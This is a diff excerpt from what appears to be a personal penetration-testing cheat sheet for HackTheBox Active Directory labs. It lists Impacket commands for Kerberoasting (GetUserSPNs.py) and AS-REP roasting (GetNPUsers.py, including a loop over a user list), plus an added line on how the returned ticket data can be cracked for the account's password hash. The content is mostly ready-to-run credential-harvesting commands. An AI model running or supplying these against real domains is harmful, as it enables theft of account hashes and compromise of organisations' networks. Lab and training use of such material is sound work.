@@ -5,5 +5,6 @@
     - GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out
 ===================================================================================================================    
 # AS-REPROASTING - finding account which have the property “Do not require Kerberos preauthentication” or UF_DONT_REQUIRE_PREAUTH set to true
+    (Attacker request TGT, in the response of KDC, contains a piece of information encrypted with the hash of the user account (will crack it), namely the encrypted session key, the TGT is encrypted with the hash of the ticketing account (kbrtgt) )
     - GetNPUsers.py htb.local/ -no-pass -usersfile user.txt -dc-ip 10.10.16.2
     - $for user in $(cat user.txt); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done 
